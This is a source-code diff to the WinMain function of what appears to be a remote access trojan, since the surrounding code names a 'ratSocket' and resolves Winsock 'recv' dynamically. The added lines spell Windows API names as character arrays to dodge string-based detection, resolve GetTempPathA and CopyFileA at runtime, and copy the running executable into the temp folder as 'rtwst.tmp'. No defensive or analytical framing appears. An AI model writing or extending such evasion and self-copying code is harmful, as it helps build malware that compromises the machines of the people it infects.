@@ -289,6 +289,49 @@ WinMain(HINSTANCE hInstance,
 		LPSTR lpCmdLine,
 		int nCmdShow)
 {
+	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
+	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
+	
+	char currentPath[MAX_PATH];
+	if ( GetModuleFileNameA(NULL, currentPath, MAX_PATH) == 0 )
+	{
+#if DEBUG
+		OutputDebugStringA("Failed getting the module file name.");
+#endif		
+	}
+
+	char tempPath[MAX_PATH];
+
+	char ca_GetTempPathA[] = { 'G','e','t','T','e','m','p','P','a','t','h','A',0 };
+	_GetTempPathA* f_GetTempPathA = (_GetTempPathA*)GetProcAddress(gLibraryKernel32, ca_GetTempPathA);
+	f_GetTempPathA(MAX_PATH, tempPath);
+
+	char newPath[MAX_PATH + 9];
+	strncpy_s(newPath, MAX_PATH, tempPath, strlen(tempPath));
+	strncat_s(newPath, "rtwst.tmp", 9);
+
+	char ca_CopyFileA[] = { 'C','o','p','y','F','i','l','e','A',0 };
+	_CopyFileA* f_CopyFileA = (_CopyFileA*)GetProcAddress(gLibraryKernel32, ca_CopyFileA);
+	if ( f_CopyFileA == NULL )
+	{
+#if DEBUG
+		char buffer[256];
+		sprintf_s(buffer, "Failure in getting CopyFileA using GetProcAddress: %d\n", GetLastError());
+		OutputDebugStringA(buffer);
+#endif		
+	}
+	
+	if ( f_CopyFileA(currentPath, newPath, 0) == 0 )
+	{
+#if DEBUG
+		char buffer[256];
+		sprintf_s(buffer, "Failure in copying the file: %d\n", GetLastError());
+		OutputDebugStringA(buffer);
+#endif		
+	}
+	
+	return 0;
+	
 	UNREFERENCED_PARAMETER(hInstance);
 	UNREFERENCED_PARAMETER(hPrevInstance);
 	UNREFERENCED_PARAMETER(lpCmdLine);
@@ -396,7 +439,7 @@ WinMain(HINSTANCE hInstance,
 	char ca_recv[] = { 'r','e','c','v', 0 };
 	gf_recv = (_recv*)GetProcAddress(ratSocket.libraryWinsock2, ca_recv);
 
-	char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
+	//char ca_kernel32[] = { 'k','e','r','n','e','l','3','2','.','d','l','l',0 };
 
 	gLibraryKernel32 = LoadLibraryA(ca_kernel32);
 	if ( !gLibraryKernel32 )
